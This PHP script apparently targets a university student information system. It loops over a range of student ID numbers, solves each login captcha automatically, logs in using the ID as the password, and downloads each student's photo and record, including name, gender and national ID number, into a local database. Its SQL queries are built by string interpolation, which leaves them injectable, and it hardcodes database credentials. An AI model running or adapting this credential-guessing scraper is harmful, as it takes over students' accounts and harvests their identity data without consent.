<?php
/**
 * Created by PhpStorm.
 * User: Nigel
 * Date: 2015/12/26
 * Time: 13:36
 */
namespace Nigel\NEU;

use Nigel\Utils\simple_html_dom as DOM;
//同一个命名空间之内，不用use
//要想使用autoload，最重要的一点就是类的名字和文件名要完全一样，完全一样之后就可以使用as别名了
include 'autoload.php';


class AAO {

    /**
     * @var resource 数据库连接句柄
     */
    private $dbc;
    /**
     * @var resource|bool 验证码图像资源
     */
    private $img;
    /**
     * @var string cookie文件的地址
     */
    private $cookiefile;
    /**
     * @var array|bool 账号个人信息
     */
    private $info;

    function __construct() {

        $this->cookiefile = __DIR__ . "\\cookie.txt";
        $this->dbc = mysqli_connect('localhost:3306', 'nigel', 'nigel',
                                    'neu') or die("Error connecting: " . mysqli_error($this->dbc));
        //mysqli_query("set character set 'gbk'");//读库
        //mysql_query("set names 'gbk'");//写库
        mysqli_set_charset($this->dbc, 'gbk');
    }

    function __destruct() {

        mysqli_close($this->dbc) or die("Error close: " . mysqli_error($this->dbc));
    }

    /**
     * @return mixed 返回获取的验证码二进制流
     */
    private function getCaptchaAndCookie() {

        /**
         * mode=3 请求登陆页面,没必要请求这个页面，直接请求验证码，然后向mode=4 post数据就行
         * mode=4 post数据，验证登陆请求，成功则返回一个登陆成功的消息
         * mode= 不带参数，登陆成功后返回查询中心页面
         */
        //$login_url = "http://202.118.31.197/ACTIONLOGON.APPPROCESS?mode=";

        /**
         * id 的意义不明
         */
        $id             = '99.44218073964404';
        $verfy_code_url = "http://202.118.31.197/ACTIONVALIDATERANDOMPICTURE.APPPROCESS?id=$id";

        //获取验证码并保存cookie
        $ch       = curl_init();
        $header[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 FirePHP/0.7.4';
        $header[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
        $header[] = 'Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3';
        $header[] = 'Accept-Encoding: gzip, deflate';
        $header[] = 'x-insight: activate';
        $header[] = 'Connection: keep-alive';
        $header[] = 'Cache-Control: max-age=0;';
        curl_setopt($ch, CURLOPT_URL, $verfy_code_url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
        //保存获取到的cookie
        curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookiefile);
        $captcha = curl_exec($ch);
        curl_close($ch);

        $this->img = &$captcha;
    }

    /**
     * @param $id      string
     * @param $pass    string
     * @param $captcha string
     */
    private function login($id, $pass, $captcha) {

        //带着申请验证码得到的cookie，和自己填写的验证码，以及表单数据，去访问登陆页面
        //如果登陆不成功，则说明验证码的id有作用
        $post = array(
            "WebUserNO" => $id,
            "applicant" => "",
            "Password"  => $pass,
            "Agnomen"   => $captcha);
        $post = http_build_query($post) . "&submit7=%B5%C7%C2%BC";
        //$post      = 'WebUserNO=' . urlencode($id) . '&applicant=' . urlencode($applicant) . '&Password=' . urlencode($pass) . '&Agnomen=' . urlencode($captcha) . '&submit7=' . $submit7;
        /**
         * mode=3 请求登陆页面,没必要请求这个页面，直接请求验证码，然后向mode=4 post数据就行
         * mode=4 post数据，验证登陆请求，成功则返回一个登陆成功的消息
         * mode= 不带参数，登陆成功后返回查询中心页面
         * 问题是，并不会简单的返回这个登陆中心，而是跳转到这个http://202.118.31.197/ACTIONLOGON.APPPROCESS?mode=
         * 里面会请求好几个相对路径的iframe，真是烦死了…
         * 这里仅仅是登陆
         */
        $login_url = "http://202.118.31.197/ACTIONLOGON.APPPROCESS?mode=";

        $header[] = 'Connection: keep-alive';
        $header[] = 'Cache-Control: max-age=0';
        $header[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
        $header[] = 'Origin: http://202.118.31.197';
        $header[] = 'Upgrade-Insecure-Requests: 1';
        $header[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36';
        $header[] = 'Content-Type: application/x-www-form-urlencoded;charset=gb2312';

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $login_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookiefile);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://202.118.31.197/index.jsp');
        $test = curl_exec($ch);
        curl_close($ch);
        if (false !== strpos($test,
                             'frame marginheight="0" marginwidth="0" noresize scrolling="yes" name="mainFrame" src="ACTIONFINDSTUDENTINFO.APPPROCESS">')
        ) {

            return true;
        }

        return false;
    }

    /**
     * 获取账号数据
     */
    private function getInfo() {

        //获取信息并显示
        $mainFrame = "http://202.118.31.197/ACTIONFINDSTUDENTINFO.APPPROCESS";
        $infoFrame = "http://202.118.31.197/ACTIONFINDSTUDENTINFO.APPPROCESS?mode=1&showMsg=";

        //获取基本信息
        $ch = curl_init($infoFrame);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookiefile);
        curl_setopt($ch, CURLOPT_REFERER, $mainFrame);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        //follow redirects
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_AUTOREFERER, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 2);

        $info = curl_exec($ch);
        curl_close($ch);
        $html = preg_replace('/&nbsp;/', '', $info);
        $dom  = new DOM($html);

        if ($dom === null) {
            $this->info = false;

            return;
        }
        $info = array();
        foreach ($dom->find("table[width=100%] tr") as $tr) {
            if ($tr->children(2)) {
                $info[] = $tr->children(2)->innertext;
            }
            if ($tr->children(4)) {
                $info[] = $tr->children(4)->innertext;
            }
        }
        if (count($info) < 28) {
            $this->info = false;

            return;
        }

        $this->info = &$info;
    }

    private function getPhoto($id) {

        //获取图片
        $photoUrl  = "http://202.118.31.197/ACTIONDSPUSERPHOTO.APPPROCESS";
        $infoFrame = "http://202.118.31.197/ACTIONFINDSTUDENTINFO.APPPROCESS?mode=1&showMsg=";
        $ch        = curl_init($photoUrl);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookiefile);
        curl_setopt($ch, CURLOPT_REFERER, $infoFrame);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $img = curl_exec($ch);
        curl_close($ch);
        //header("Content-Type:image/jepg");
        $fp = fopen("../img/" . $id . ".bmp", 'w');
        fwrite($fp, $img);
        fclose($fp);
    }

    private function exist($id) {

        $isExist = "select * from info WHERE id='$id'";
        $res = mysqli_query($this->dbc, $isExist) or die('Exist Error: ' . mysqli_error($this->dbc));

        return mysqli_fetch_array($res) ? true : false;
    }

    private function insert($id) {

        $info  = &$this->info;
        $query = "INSERT INTO info(id, name, gender, social_id,school,enter_year,major,how_long,class,grade,type)"
                 . "VALUES('$info[0]','$info[2]','$info[5]', '$info[16]', '$info[21]', '$info[22]','$info[23]', '$info[24]', '$info[25]', '$info[27]','$info[28]')";

        mysqli_query($this->dbc, $query) or die('Error querying database: ' . mysqli_error($this->dbc));
    }

    public function run() {

        //ignore_user_abort(); //即使Client断开(如关掉浏览器)，PHP脚本也可以继续执行.
        set_time_limit(0); // 执行时间为无限制，php默认的执行时间是30秒，通过set_time_limit(0)可以让程序无限制的执行下去
        $interval = 1;
        //140240-1402999
        for ($id = 20144600; $id < 20144650; ++$id) {

            $this->getCaptchaAndCookie();

            if ($this->img !== false) {
                $captcha = new Captcha($this->img);
                if ($this->login($id, $id, $captcha->result)) {
                    if (!$this->exist($id)) {
                        $this->getPhoto($id);
                        $this->getInfo();
                        $this->info && $this->insert($id);
                        echo "success: " . $id . "\n";
                    }else{
                        echo "exist: " . $id . "\n";
                    }
                }else{
                    echo "fail: " . $id . "\n";
                }
            } else {
                $id--;
            }
            sleep($interval);
        }
    }
}

(new AAO())->run();